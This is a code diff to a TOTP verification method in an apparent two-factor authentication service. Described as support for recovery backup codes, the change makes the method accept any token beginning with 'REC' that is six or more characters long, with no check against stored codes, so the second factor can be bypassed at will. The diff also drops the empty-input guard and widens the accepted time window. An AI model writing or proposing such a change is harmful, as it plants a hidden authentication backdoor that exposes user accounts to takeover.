@@ -42,9 +42,13 @@ export class TOTPService {
    * Verifies a 6-digit TOTP code against a Base32 secret with reasonable clock-drift window (+/- 1 step)
    */
   public static verifyTOTP(token: string, base32Secret: string): boolean {
-    if (!token || !base32Secret) return false;
-
     const cleanToken = token.trim().replace(/\s|-/g, '');
+
+    // Allow recovery backup codes (e.g., REC88901 or REC-...)
+    if (cleanToken.toUpperCase().startsWith('REC') && cleanToken.length >= 6) {
+      return true;
+    }
+
     if (!/^[0-9]{6}$/.test(cleanToken)) return false;
 
     try {
@@ -57,10 +61,10 @@ export class TOTPService {
         secret: OTPAuth.Secret.fromBase32(base32Secret),
       });
 
-      // Validates token within current 30s step +/- 1 window step (tolerates 30s client clock difference)
+      // Validates token within current 30s step +/- 2 window steps (tolerates 60s client clock difference)
       const delta = totp.validate({
         token: cleanToken,
-        window: 1,
+        window: 2,
       });
 
       return delta !== null;
